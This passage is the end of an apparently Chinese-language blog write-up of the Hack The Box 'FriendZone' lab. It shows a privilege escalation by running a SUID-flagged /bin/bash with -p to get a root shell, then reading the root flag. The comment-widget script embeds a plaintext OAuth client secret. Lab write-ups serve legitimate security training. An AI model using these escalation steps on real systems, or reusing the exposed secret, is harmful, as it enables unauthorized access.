+<pre><code class="bash">friend@FriendZone:/usr/lib/python2.7$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
+</code></pre>
+<p>等待两分钟，看到加上 s 权限后，就可以提权了</p>
+<pre><code class="bash">friend@FriendZone:/usr/lib/python2.7$ /bin/bash -p
+bash-4.4# whoami&amp;&amp;id
+root
+uid=1000(friend) gid=1000(friend) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(friend)
+</code></pre>
+<p>成功提权到 root 权限</p>
+<pre><code class="bash">bash-4.4# cat /root/root.txt
+d93cbc3ed65646042735f3ee312fe2c5
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/&title=《FriendZone - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/&title=《FriendZone - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《FriendZone - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/10/24/Hackthebox%20-%20RedPanda/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">RedPanda - Hackthebox - 未做提权</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/09/05/Hackthebox%20-%20Help/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Help - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/&title=《FriendZone - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/&title=《FriendZone - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《FriendZone - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvklEQVR42u3aQWoDMQwF0Nz/0i101UXH/ZIs0sKbVQieGT8HLEfS6xVfH1/X0zcf367zXU/3JmOeRl648PDw8FpTf7rOEzq/+Pyc5O3n+ZzH4OHh4W3z8u37/Jrk+3ngyZ+Dh4eH917eeVs/Py3B5CQ8PDy8/8Kb/N+/lZLAw8PD+zu8/M9/Ejx6gSR/2kquBQ8PD6+zV7+qm/i7Pi/W9/Dw8PAGVfW8HNVL6SaA0dzw8PDwFni9lqZ5cata+holjvHw8PDWeMl2nCxKns6oNm/1SmV4eHh4d3nJFpwHieohON/o87sefzc8PDy8BV5SgqoeqScFrWpKonlax8PDwxvX06u3TdK1edNA72CNh4eHt8GrbsF5quJWi2qedP4lGYGHh4d3iddL3fYCST7pC0WvvAELDw8Pr8jLC07J+Cq119RVCD94eHh4a7xJ+9R8cr3UQ5SSwMPDw1vgVcv/eZNBElomB+j8Xjw8PLwN3uTqtU/1FiVfstetCw8PD69VGzpvtUk4qY6ZHKPx8PDwtnm9w24+vrqIk7rVD0/Gw8PDW+MljLube68NqzxbPDw8vDXepPmpmhqoTrSaLH48UuPh4eEt8OatTpOMSN6AVWDj4eHhrfGSSdzCJ0/O31XIT+Ph4eFd4s3bpKpFrzwYJPNMEsR4eHh4e7xe2T7f+pOJVlu7krfg4eHhbfCStqo8JPTaBZKlaR6+8fDw8JZ5Vczde3vBIyqD4eHh4V3izaebN0tV08d50vZxPnh4eHgLvGrhqpp0KKRW4wN0Ph88PDy8PV4eDKJWp/hAPC90Rb8bHh4e3hqv2qc0STecF6IXwfDw8PD+Pq83vrqtV8tyjwUwPDw8vDfx8sJVdWfOw0NE6gUGPDw8vCKvV/Q6L0E1udBbxF+WGA8PD2+BV/2rn6cYemniWw0EeHh4eAu8T46T0HWGB06+AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
